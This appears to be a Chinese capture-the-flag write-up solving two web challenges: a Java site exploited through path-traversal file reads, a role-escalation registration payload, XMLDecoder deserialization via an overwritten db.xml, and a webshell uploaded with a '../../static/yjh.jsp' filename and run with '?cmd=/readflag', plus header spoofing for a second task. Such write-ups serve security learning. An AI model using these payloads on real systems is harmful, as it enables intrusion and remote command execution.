data.content:
[GKCTF 2021]babycat
点击注册，提示不能注册，抓个注册包，发现有源码

function doRegister(obj){
if(obj.username==null || obj.password==null){
alert(“用户名或密码不能为空”);
}else{
var d = new Object();
d.username=obj.username;
d.password=obj.password;
d.role=”guest”;

        $.ajax({
            url:"/register",
            type:"post",
            contentType: "application/x-www-form-urlencoded; charset=utf-8",
            data: "data="+JSON.stringify(d),
            dataType: "json",
            success:function(data){
                alert(data)
            }
        });
    }
}

那就post传参

{“username”:”admin”,”password”:”password”}

并添加Content-Type: application/x-www-form-urlencoded

进入后，页面有文件下载和上传功能，但是上传功能只能管理员使用

那就先尝试一下任意文件读取

这题的网站是Java写的，war包的结构：（war 包与 jar 包是很类似的，不过 war 包通常用于网站，它是一个可以直接运行的 web 模块。）

先读取一下web.xml

?file=../../WEB-INF/web.xml

可以看到有这么几个类，路径也告诉了，可以把他们的代码都下载下来

register com.web.servlet.registerServlet login com.web.servlet.loginServlet home com.web.servlet.homeServlet upload com.web.servlet.uploadServlet download com.web.servlet.downloadServlet logout com.web.servlet.logoutServlet logout /logout download /home/download register /register java login /login home /home upload /home/upload loginFilter com.web.filter.LoginFilter loginFilter /home/* java /WEB-INF/index.jsp 主要的是这个

../../WEB-INF/classes/com/web/servlet/registerServlet.class

下载下来是乱码，用jd-gui反编译即可

protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
resp.setCharacterEncoding(“UTF-8”);
Integer res = Integer.valueOf(0);
String role = “”;
Gson gson = new Gson();
Person person = new Person();
Connection connection = null;
String var = req.getParameter(“data”).replaceAll(“ “, “”).replace(“‘“, “"“);
Pattern pattern = Pattern.compile(“"role":"(.*?)"“);
Matcher matcher = pattern.matcher(var);
while (matcher.find())
role = matcher.group();
if (!StringUtils.isNullOrEmpty(role)) {
var = var.replace(role, “"role":"guest"“);
person = (Person)gson.fromJson(var, Person.class);
} else {
person = (Person)gson.fromJson(var, Person.class);
person.setRole(“guest”);
}
System.out.println(person);
要使用上传文件的功能，就必须让role等于admin

但因为他用的是while循环赋值到一个变量上，所以该变量实际上是匹配到的最后一个结果，如**{“username”:“admin”,“password”:“admin”,“role”:“admin”,“role”:“test”}**他匹配到的应该是”role”:“test”，然后下面会把注册时传入的数据中的”role”:”test”部分做替换，变成{“username”:“admin”,“password”:“admin”,“role”:“admin”,“role”:“guest”}，这里应该就是漏洞点了。

可以看一个小测试

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {
public static void main(String[] args) {
Pattern pattern = Pattern.compile(“"role":"(.*?)"“);
String var = “{"username":"admin","password":"admin","role":"admin","role":"test"}”;
String role = null;
for(Matcher matcher = pattern.matcher(var); matcher.find(); role = matcher.group()) {
}
System.out.println(role);
}
}
//“role”:”test”
可以构造这样的payload

data={“username”:”1”,”password”:”1”,”role”:”admin”,”1”:{“role”:”1”}}
对于这一处还有另一种解法

这里由于是json库，并且是gson进行解析，于是可以在 json中自由使用注释符/**/

data={“username”:”1”,”password”:”1”,”role”:”admin”/“role”:”test”/}
然后登录即可使用文件上传功能

然后利用刚刚的任意文件下载看看上传功能的代码

package com.web.servlet;

import com.web.dao.Person;
import com.web.util.tools;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

@MultipartConfig
public class uploadServlet extends HttpServlet {
public uploadServlet() {
}

protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    String admin = "admin";
    Person user = (Person)req.getSession().getAttribute("user");
    System.out.println(user.getRole());
    if (!admin.equals(user.getRole())) {
        req.setAttribute("error", "<script>alert('admin only');history.back(-1)</script>");
        req.getRequestDispatcher("../WEB-INF/error.jsp").forward(req, resp);//将请求和响应发送给/WEB-INF/error.jsp
    } else {
        List<String> fileNames = new ArrayList();
        tools.findFileList(new File(System.getenv("CATALINA_HOME") + "/webapps/ROOT/WEB-INF/upload/"), fileNames);
        req.setAttribute("files", fileNames);
        System.out.println(fileNames);
        req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
    }

    req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
}

protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    if (!ServletFileUpload.isMultipartContent(req)) {
        req.setAttribute("error", "<script>alert('something wrong');history.back(-1)</script>");
    }

    DiskFileItemFactory factory = new DiskFileItemFactory();
    factory.setSizeThreshold(3145728);
    factory.setRepository(new File(System.getProperty("java.io.tmpdir")));
    ServletFileUpload upload = new ServletFileUpload(factory);
    upload.setFileSizeMax(41943040L);
    upload.setSizeMax(52428800L);
    String uploadPath = System.getenv("CATALINA_HOME") + "/webapps/ROOT/WEB-INF/upload/";

    try {
        List<FileItem> formItems = upload.parseRequest(req);
        if (formItems != null && formItems.size() > 0) {
            Iterator var7 = formItems.iterator();

            label34:
            while(true) {
                FileItem item;
                do {
                    if (!var7.hasNext()) {
                        break label34;
                    }

                    item = (FileItem)var7.next();
                } while(item.isFormField());

                String fileName = item.getName();
                String ext = fileName.substring(fileName.lastIndexOf(".")).replace(".", "");
                String name = fileName.replace(ext, "");
                if (checkExt(ext) || checkContent(item.getInputStream())) {
                    req.setAttribute("error", "upload failed");
                    req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
                }

                String filePath = uploadPath + File.separator + name + ext;
                File storeFile = new File(filePath);
                item.write(storeFile);
                req.setAttribute("error", "upload success!");
            }
        }
    } catch (Exception var14) {
        req.setAttribute("error", "<script>alert('something wrong');history.back(-1)</script>");
    }

    req.getRequestDispatcher("../WEB-INF/upload.jsp").forward(req, resp);
}

private static boolean checkExt(String ext) {
    boolean flag = false;
    String[] extWhiteList = new String[]{"jpg", "png", "gif", "bak", "properties", "xml", "html", "xhtml", "zip", "gz", "tar", "txt"};
    if (!Arrays.asList(extWhiteList).contains(ext.toLowerCase())) {
        flag = true;
    }

    return flag;
}

private static boolean checkContent(InputStream item) throws IOException {
    boolean flag = false;
    InputStreamReader input = new InputStreamReader(item);
    BufferedReader bf = new BufferedReader(input);
    String line = null;
    StringBuilder sb = new StringBuilder();

    while((line = bf.readLine()) != null) {
        sb.append(line);
    }

    String content = sb.toString();
    String[] blackList = new String[]{"Runtime", "exec", "ProcessBuilder", "jdbc", "autoCommit"};

    for(int i = 0; i < blackList.length; ++i) {
        if (content.contains(blackList[i])) {
            flag = true;
        }
    }

    return flag;
}

}
白名单有.xml

WP是说看代码可以发现注册业务中导入了 com.web.dao.baseDao，在其源码中用到了方法 XMLDecoder。

public static void getConfig() throws FileNotFoundException {
Object obj = (new XMLDecoder(new FileInputStream(System.getenv(“CATALINA_HOME”) + “/webapps/ROOT/db/db.xml”))).readObject();
if (obj instanceof HashMap) {
HashMap map = (HashMap)obj;
if (map != null && map.get(“url”) != null) {
driver = (String)map.get(“driver”);
url = (String)map.get(“url”);
username = (String)map.get(“username”);
password = (String)map.get(“password”);
}
}

}
其中 System.getenv(“CATALINA_HOME”) 可以使用前面的文件包含读取 /proc/self/environ 得到为 /usr/local/tomcat。因此可以尝试将 db.xml 覆盖为恶意代码后使用注册业务触发 XMLDecoder 反序列化。

可以使用冰蝎的jsp木马

反弹shell 都要重新登录一下来触发payload

解法二
这段代码

if (checkExt(ext) || checkContent(item.getInputStream())) {
req.setAttribute(“error”, “upload failed”);
req.getRequestDispatcher(“../WEB-INF/upload.jsp”).forward(req, resp);
}
他虽然检查了，但是并没有return，所以直接上传，没啥影响，但是upload目录上传不了，不知道为啥

由于有这段代码

String filePath = uploadPath + File.separator + name + ext;
路径直接是拼接的

上传到static目录，filename命名为../../static/yjh.jsp，访问/static/yjh.jsp，虽然会爆500，但是任然可以执行命令

/static/yjh.jsp?cmd=/readflag
[MoeCTF 2021]Do you know HTTP
页面显示

用’HS’来请求试试？
把GET改为HS

只有本地ip地址才可以哦！
添加X-Forwarded-For: 127.0.0.1

我希望你是从’www.ltyyds.com'过来的！
添加Referer: www.ltyyds.com

‘LT’才是本题官方浏览器哦！
想要得到flag，就用官方浏览器吧！
改为User-Agent: LT
